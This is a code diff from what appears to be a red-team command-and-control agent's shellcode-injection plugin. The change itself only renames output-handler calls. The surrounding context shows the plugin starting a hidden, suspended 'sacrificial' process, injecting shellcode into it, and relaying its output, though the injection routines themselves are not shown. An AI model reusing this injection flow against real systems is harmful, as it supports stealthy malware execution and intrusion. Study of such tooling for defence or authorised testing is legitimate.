@@ -1,10 +1,11 @@
-﻿using Athena.Plugins;
+﻿using Athena.Commands.Models;
 using Athena.Utilities;
 using shellcode_inject.Techniques;
 using Microsoft.Win32.SafeHandles;
 using System.Runtime.InteropServices;
 using shellcode_inject;
 using System.Diagnostics;
+using Athena.Commands;
 
 namespace Plugins
 {
@@ -99,7 +100,7 @@ namespace Plugins
             success = Native.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
             if (!success)
             {
-                PluginHandler.WriteLine($"Error: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
+                TaskResponseHandler.WriteLine($"Error: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
                 return false;
             }
 
@@ -125,11 +126,11 @@ namespace Plugins
             bool ret = Native.CreateProcess(null, processName, ref ps, ref ts, true, Native.EXTENDED_STARTUPINFO_PRESENT | Native.CREATE_NO_WINDOW | Native.CREATE_SUSPENDED, IntPtr.Zero, null, ref siEx, out pInfo);
             if (!ret)
             {
-                PluginHandler.WriteLine($"Failed to start: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
+                TaskResponseHandler.WriteLine($"Failed to start: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
                 return false;
             }
 
-            PluginHandler.WriteLine($"Process Started with ID: {pInfo.dwProcessId}", task_id, false);
+            TaskResponseHandler.WriteLine($"Process Started with ID: {pInfo.dwProcessId}", task_id, false);
 
             method.Inject(sc, pInfo.hProcess);
 
@@ -225,7 +226,7 @@ namespace Plugins
                         {
                             if (exit == true)
                             {
-                                PluginHandler.WriteLine("Finished.", task_id, true);
+                                TaskResponseHandler.WriteLine("Finished.", task_id, true);
                                 break;
                             }
                             else
@@ -242,7 +243,7 @@ namespace Plugins
                         if (bytesRead > 0)
                         {
                             Debug.WriteLine($"[{DateTime.Now}] Reading {bytesRead} from sacrificial process.");
-                            PluginHandler.Write(new string(buf), task_id, false);
+                            TaskResponseHandler.Write(new string(buf), task_id, false);
                         }
 
                     } while (true);
